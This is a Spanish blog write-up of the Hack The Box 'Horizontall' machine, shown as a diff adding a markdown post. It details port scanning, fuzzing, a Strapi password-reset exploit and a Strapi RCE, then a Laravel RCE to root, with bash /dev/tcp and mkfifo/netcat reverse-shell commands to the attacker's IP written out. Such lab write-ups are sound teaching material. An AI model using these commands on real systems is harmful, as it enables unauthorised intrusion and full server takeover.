@@ -1,0 +1,145 @@
+---
+title: 'CTF - Horizontall WriteUp'
+date: '2022-02-09'
+tags: ["CTF", "Hacking", "VueJS", "Fuzzing", "Rce", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Hago un escaneo de puertos todos los puertos disponibles con NMAP
+---
+
+Hago un escaneo de puertos todos los puertos disponibles con NMAP.
+
+
+```
+nmap -p- -sS -T5 --open -vvv 10.10.11.105 -oG allPorts
+```
+Me devuelve los puertos 80 y 22 como abiertos y abro en un navegador la siguiente url http://10.10.11.105.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image.png)Percibo que me encuentro ante una SPA hecha en VueJS. En un inicio, el código fuente de la web está oculto puesto que se carga posteriormente cuando el navegador interpreta Javascript. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para recuperar la información.
+
+![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_2-1.png)El subdominio que aparece reflejado lo introduzco en mi /etc/hosts con el fin de poder resolver dicha dirección en caso de encontrarme con un virtual hosting.
+
+
+```
+❯ cat /etc/hosts
+───────┬─────────────────────────────────────────────────────────────────────
+       │ File: /etc/hosts
+───────┼─────────────────────────────────────────────────────────────────────
+   1   │ # Host addresses
+   2   │ 127.0.0.1  localhost
+   3   │ 127.0.1.1  iocio-virtualbox
+   4   │ ::1        localhost ip6-localhost ip6-loopback
+   5   │ ff02::1    ip6-allnodes
+   6   │ ff02::2    ip6-allrouters
+   7   │ 
+   8   │ 10.10.11.105    horizontall.htb www.horizontall.htb api-prod.horizontall.htb
+```
+Realizo fuzzing contra el dominio api-prod.horizontall.htb.
+
+
+```
+ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+Target: http://api-prod.horizontall.htb/FUZZ
+Total requests: 141708
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload               
+=====================================================================    
+000000014:   200        19 L     33 W       413 Ch      "http://api-prod.horizontall.htb/"
+000000350:   200        0 L      21 W       507 Ch      "reviews"             
+000001895:   200        16 L     101 W      854 Ch      "admin"               
+```
+Encuentro una ruta interesante en /admin. En ella, aparece un formulario de login de una plataforma denominada Strapi.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-3.png)Buscando un poco encuentro la siguiente [vulnerabilidad](https://www.exploit-db.com/exploits/50237) que nos permite resetear la contraseña del usuario. Analizando el script, veo que accediendo a la ruta http://api-prod.horizontall.htb/admin/strapiVersion puedo ver la versión del CMS que está detrás. Eso me sirve para confirmar que la versión *3.0.0-beta.17.4* es vulnerable. Aun así, necesito un usuario válido para poder emplear el script.
+
+Si rellenamos el formulario de "olvidó su contraseña", observamos que hay una fuga de información que no debería existir. **Este tipo de formularios no deberían dar pistas sobre que usuarios existen o cuáles no.**
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-5.png)Probamos con admin@horizontall.htb y vemos que no pone nada, por lo que asumimos que ese usuario **SI** existe.
+
+Añadimos en el script los campos acordes a nuestro entorno y ejecutamos.
+
+
+```
+❯ python3 password.py
+[*] strapi version: 3.0.0-beta.17.4
+[*] Password reset for user: admin@horizontall.htb
+[*] Setting new password
+[+] New password 'admin' set for user admin@horizontall.htb
+```
+De esta forma, hemos modificado la contraseña y podemos ejecutar otro tipo de vulnerabilidades que requieren de autenticación previa. Podemos encontrar una vulnerabilidad de ese tipo [aquí](https://www.exploit-db.com/exploits/50239). Nos ponemos en escucha en el puerto 443 con netcat. 
+
+
+```
+nc -lvp 443
+```
+Modificamos el script para adaptarlo a nuestras necesidades y ejecutamos.
+
+
+```
+python3 rce.py http://api-prod.horizontall.htb
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+$ bash -c 'bash -i & /dev/tcp/10.10.14.15/443 0&1'
+```
+De esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.
+
+
+```
+strapi@horizontall:~$ whoami
+strapi
+strapi@horizontall:~$ id
+uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
+```
+Verifico que puertos hay abiertos en el localhost  de la máquina por si hubiese algún servicio oculto ejecutandose.
+
+
+```
+strapi@horizontall:~$ netstat -tulpn
+Proto Recv-Q Send-Q Local Address           Foreign Address         State    
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN  
+...
+```
+Con un curl, vemos que es una CMS de Laravel. Creamos una clave ssh para poder conectarnos a la máquina estableciendo un túnel entre mi máquina y la máquina vulnerable con tal de poder ver ese puerto oculto en su localhost.
+
+
+```
+ssh -L 80:127.0.0.1:8000 -i strapi_id_rsa strapi@10.10.11.105
+```
+![](https://blog.ikerocio.com/content/images/2022/02/image-6.png)Navegando un poco, encontramos un [exploit](https://www.exploit-db.com/exploits/49424) de la versión de Laravel que está siendo ejecutada en la máquina. Comprobamos que funciona con un 'whoami'.
+
+
+```
+python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'whoami'
+Exploit...
+root
+```
+Una vez verificado, nos ponemos en escucha con netcat.
+
+
+```
+nc -lvp 443
+```
+Y nos mandamos una reverse shell con netcat versión antigua (la que tiene la máquina instalada).
+
+
+```
+python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&1|nc 10.10.14.15 443 /tmp/f'
+```
+Recibimos la shell en nuestro equipo y terminamos con esta máquina.
+
+
+```
+❯ nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560
+# whoami
+root
+# cat /root/root.txt
+7360xxxxxxxxxxxxxxxxxxx
+
+```
